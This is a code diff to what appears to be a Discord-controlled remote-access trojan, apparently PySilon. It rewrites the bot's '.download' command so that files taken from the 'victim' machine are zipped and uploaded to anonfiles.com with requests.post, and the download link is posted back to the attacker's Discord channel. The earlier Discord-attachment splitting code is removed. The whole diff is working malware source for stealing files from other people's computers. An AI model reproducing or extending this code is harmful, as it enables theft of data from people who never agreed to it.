@@ -1,7 +1,7 @@
-from filesplit.split import Split
 from shutil import copy2, rmtree
 from zipfile import ZipFile
 import os
+import requests
 # end of imports
 
 # on reaction add
@@ -24,28 +24,32 @@ elif message.content[:9] == '.download':
                     target_file += '.zip'
                     with ZipFile(target_file,'w') as zip:
                         for file in get_all_file_paths('.'.join(target_file.split('.')[:-1])):
-                            zip.write(file)
+                            try: zip.write(file)
+                            except Exception as e:
+                                message.channel.send(e)
+                                pass
+                    await message.channel.send('```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```')
+                    files = {
+                        'file': (f'{message.content[10:]}.zip', open(f'{target_file}', 'rb')),
+                    }
+                    url = 'https://api.anonfiles.com/upload'
+                    response = requests.post(url, files=files)
+                    data = response.json()
+                    await message.channel.send(f"```{message.content[10:]}.zip:``` {data['data']['file']['url']['short']}")
 
-                if os.stat(target_file).st_size <= 8388608:
-                    await message.channel.send(file=discord.File(target_file))
                 else:
-                    try: os.mkdir('temp')
-                    except: rmtree('temp'); os.mkdir('temp')
-                    Split(target_file, 'temp').bysize(1024*1024*25)
-                    splitted_files_to_send = os.listdir('temp')
-                    for sfile in splitted_files_to_send:
-                        if sfile != 'manifest':
-                            os.rename('temp/' + sfile, 'temp/' + sfile + '.pysilon')
-                    splitted_files_to_send = os.listdir('temp')
+                    await message.channel.send('```Uploading to anonfiles.. this can take a while depending on the file size and the victim\'s internet speed..```')
+                    files = {
+                        'file': (f'{message.content[10:]}', open(f'{target_file}', 'rb')),
+                    }
 
-                    messages_from_sending_big_file = []
-                    for i in splitted_files_to_send:
-                        messages_from_sending_big_file.append(await message.channel.send(file=discord.File('temp/' + i)))
-                    rmtree('temp')
-                    reaction_msg = await message.channel.send('```Download all above files, run merger.exe and then react to this message```')
-                    messages_from_sending_big_file.append(reaction_msg)
-                    await reaction_msg.add_reaction('✅')
+                    url = 'https://api.anonfiles.com/upload'
+                    response = requests.post(url, files=files)
+
+                    data = response.json()
+
+                    await message.channel.send(f"```{message.content[10:]}:``` {data['data']['file']['url']['short']}")
             else:
                 reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
     else:
-        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+        reaction_msg = await message.channel.send('_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
